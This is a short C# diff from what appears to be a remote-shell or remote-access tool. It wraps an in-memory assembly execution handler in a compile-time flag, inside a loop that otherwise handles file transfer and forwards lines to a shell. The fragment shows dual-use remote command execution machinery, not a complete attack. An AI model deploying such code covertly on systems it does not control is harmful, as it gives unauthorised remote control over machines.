@@ -295,8 +295,10 @@ namespace SvcUtil
                         // Check for special commands (file transfer, assembly exec)
                         if (FileTransfer.TryHandle(line, session.Stream))
                             continue;
+#if EXEC_ASM
                         if (AssemblyRunner.TryHandle(line, session.Stream))
                             continue;
+#endif
 
                         // Not a special command — forward the line + newline to shell
                         byte[] lineBytes = Encoding.UTF8.GetBytes(line + "\n");
